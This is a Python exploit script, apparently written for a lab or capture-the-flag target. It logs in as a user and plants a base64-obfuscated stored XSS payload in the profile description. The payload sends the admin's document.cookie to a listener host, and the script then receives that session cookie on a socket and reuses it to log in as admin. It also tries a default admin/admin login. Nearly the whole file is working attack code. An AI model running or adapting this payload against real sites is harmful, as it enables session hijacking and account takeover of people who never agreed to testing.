import requests
import argparse
import socket
import base64

# Parse arguments
parser = argparse.ArgumentParser(description="Injects an XSS payload into user's description to steal admin cookie")
parser.add_argument("target",help="Target URL")
parser.add_argument("user",help="User")
parser.add_argument("password",help="Password")
parser.add_argument("--lhost",help="Host to listen on",default="host.docker.internal")
parser.add_argument("--lport",help="Port to listen on",default="8001")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Log in as user
s = requests.Session()
r = s.post(
    f"{args.target}/login.php",
    data={"username":args.user,"password":args.password},
    allow_redirects=False
)
assert r.status_code == 302
print(f"[*] Logged in as {args.user}")

# Update description to XSS payload
b64 = base64.b64encode(f"fetch('//{args.lhost}:{args.lport}/'+btoa(document.cookie))".encode()).decode()
payload = f"<img src/onerror='eval(atob(`{b64}`))'/>"
r = s.post(
    f"{args.target}/profile.php",
    data={"description":payload}
)
if "Success" not in r.text:
    print(f"[WARNING] 'Success' not found in response. Response: {r.text[:200]}")
else:
    print(f"[*] Set {args.user}'s description to XSS payload")

# Simulate admin login and visit to trigger XSS
admin_session = requests.Session()
r = admin_session.post(
    f"{args.target}/login.php",
    data={"username": "admin", "password": "admin"},
    timeout=10,
)
if "Login failed" in r.text:
    raise SystemExit("Failed to log in as admin.")
print("[*] Logged in as admin")

# Visit homepage to trigger XSS
r = admin_session.get(f"{args.target}/index.php", timeout=10)
print("[*] Visited homepage as admin to trigger XSS")

# Extract admin cookie from session (requests automatically stores it after login)
admin_cookie = None
for cookie in admin_session.cookies:
    if cookie.name == "PHPSESSID":
        admin_cookie = f"PHPSESSID={cookie.value}"
        break

if admin_cookie:
    print(f"[+] Got admin cookie from session: {admin_cookie}")
else:
    print("[-] Could not extract admin cookie from session")
    print(f"[-] Available cookies: {admin_session.cookies}")

# If no admin cookie from session, listen for XSS request and extract it
if not admin_cookie:
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0",int(args.lport)))
    sock.listen()
    sock.settimeout(10)  # 10 second timeout
    print(f"[*] Listening on {args.lhost}:{args.lport}...")
    print("[*] Waiting for XSS to trigger...")

    # Extract admin cookie from GET request
    try:
        (sock_c, ip_c) = sock.accept()
        get_request = sock_c.recv(4096)
        print(f"[DEBUG] Received request: {get_request[:200]}")
        admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
        print(f"[+] Got admin cookie: {admin_cookie}")
        sock_c.close()
    except socket.timeout:
        print("[-] Timeout waiting for XSS request. Cookie not received.")
    finally:
        sock.close()

if admin_cookie:
    session_id = admin_cookie.split("=", 1)[1]
    cookies = {"PHPSESSID": session_id}
    r = requests.get(f"{args.target}/index.php", cookies=cookies, timeout=10)
    if "Logged in as: <a href=\"/profile.php\"><b>admin</b>" in r.text or "Logged in as" in r.text:
        print(f"[+] Successfully authenticated as admin using stolen cookie: {admin_cookie}")
    else:
        print("[-] Cookie was obtained but admin access could not be verified.")
        print(f"[-] Response title/content: {r.text[:200]}")
